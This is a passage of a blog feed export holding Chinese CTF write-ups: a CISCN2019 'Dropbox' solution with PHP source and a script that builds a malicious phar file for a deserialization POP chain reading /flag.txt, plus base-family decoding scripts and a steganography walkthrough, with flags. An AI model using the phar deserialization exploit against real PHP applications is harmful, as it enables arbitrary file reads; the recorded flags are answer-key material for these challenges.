class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中利用的重中之重是下面的部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();           <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);      <span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h2><p>用下面的脚本生成一个phar的文件，菜狗痛枯。贼鸡儿麻烦啊。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;7.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析一下pop链</p><blockquote><p>首先是创建一个user类的对象$a，然后将$a的db属性实例化为FileList对象。FileList里的$file属性实例化为File对象,利用filename属性读取flag.txt文件,最后用$this-&gt;files &#x3D; array($file);负责输出flag。</p></blockquote><blockquote><p>她的各种方法的调用顺序为，首先$a的db属性实例化为FileList对象，这样当$a对象被销毁时就会触发__call()函数<code>(因为db实例化为对象了，而filelist类里面没有close()方法，故会触发__call()方法)</code>。第二是为使close方法里面获取的文件为flag，就要让<code>$this-&gt;filename=flag文件</code>，就在filelist类里面写入了file属性&#x3D;file对象，并且该对象的filename属性为&#x2F;flag.txt也就是我们的文件。现在flag已经在file对象里面了，然后我们再借用一下filelist类的__call()方法，把flag.txt打入results里面，最后通过析构函数将results打入result，然后入table，最后将table属性echo出来，实现读取文件。</p></blockquote><h2 id="生成phar文件-1"><a href="#生成phar文件-1" class="headerlink" title="生成phar文件"></a>生成phar文件</h2><p>想生成phar文件要先把只读属性给关掉，如下图所示<img src="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1//2.png" alt="2.png">，然后生成phar文件之后上传（要先改后缀名为png）。</p><p>上传成功后打开bp，删除文件时改包名为<code>phar://7.png</code>，成功获取flag如图</p><p><img src="/2020/10/22/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-1//3.png" alt="3.png"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>向自己不熟悉的方向发起挑战，虽然开始会有些困难，但是坚持下去就能获得快乐，嘿嘿。</p><blockquote><p>月上柳梢头，人约黄昏后。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> phar反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFCTF2018-BASE</title>
      <link href="/2020/10/09/AFCTF2018-BASE/"/>
      <url>/2020/10/09/AFCTF2018-BASE/</url>
      
        <content type="html"><![CDATA[<h2 id="各种base"><a href="#各种base" class="headerlink" title="各种base"></a>各种base</h2><p>这个刚开始的时候看到题目首先就想到要使用base64试一试，没，不行。看了wp后知道了，BASE没64的目的是什么呢？不就是想让你知道这不是一个简单的base64的题目马？唉，没经验啊没经验。。。</p><blockquote><p>下面首先是我的代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">input</span>(<span class="string">&quot;请输入需要解密的base64：&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a = base64.b64decode(a)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;多重解密结束!&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>下面是带解密内容，我丢这么长（好长）？<br><img src="/2020/10/09/AFCTF2018-BASE//QQ%E6%88%AA%E5%9B%BE20201009223047.png"></p><p>下面是用我的脚本的结果，这很明显是成功不了的。。。<br><img src="/2020/10/09/AFCTF2018-BASE//QQ%E6%88%AA%E5%9B%BE20201009223300.png"></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>为什么成功不了呢？因为加密方式不只有base64加密，是base64家族的加密，得用下面的大神的脚本，其实就是循环里面多尝试了base家族的其他的解密方式。。<br>)base家族多重解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;flag_encode.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file2 = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>) </span><br><span class="line">base = file.read()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        base = base64.b32decode(base).decode()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            base = base64.b64decode(base).decode()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                base = base64.b16decode(base).decode()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;解码完毕qwq！&quot;</span>)</span><br><span class="line">                file2.write(base)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><a href="https://shawroot.hatenablog.com/entry/2019/12/30/AFCTF2018/BUUCTF-BASE">看大佬的博客</a></p><h2 id="capture-the-flag"><a href="#capture-the-flag" class="headerlink" title="capture the flag"></a>capture the flag</h2><p><img src="/2020/10/09/AFCTF2018-BASE//QQ%E6%88%AA%E5%9B%BE20201009224151.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">afctf&#123;U_5h0u1d_Us3_T00l5&#125;</span><br><span class="line"></span><br><span class="line">flag&#123;U_5h0u1d_Us3_T00l5&#125;</span><br></pre></td></tr></table></figure><p>大佬们的python语言用得出神入化，我丢，好好看好好学。。。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020-藏藏藏</title>
      <link href="/2020/10/05/BJDCTF2020-%E8%97%8F%E8%97%8F%E8%97%8F/"/>
      <url>/2020/10/05/BJDCTF2020-%E8%97%8F%E8%97%8F%E8%97%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>先给拉到kal里面，并改名为<code>1.jpg</code>，用命令<code>binwalk 1.jpg</code>看到下面有个压缩包。</p><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>用命令<code>foremost 1.jpg</code>直接分离出zip文件，foremost牛x。</p><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>压缩包里面有word文档，拉到windows里面打开后是一张二维码，扫描后是flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;you are the best!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 文件隐写 </tag>
            
            <tag> foremost简单使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF2020_一叶障目</title>
      <link href="/2020/10/05/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/"/>
      <url>/2020/10/05/BJDCTF2020-%E4%B8%80%E5%8F%B6%E9%9A%9C%E7%9B%AE/</url>
      
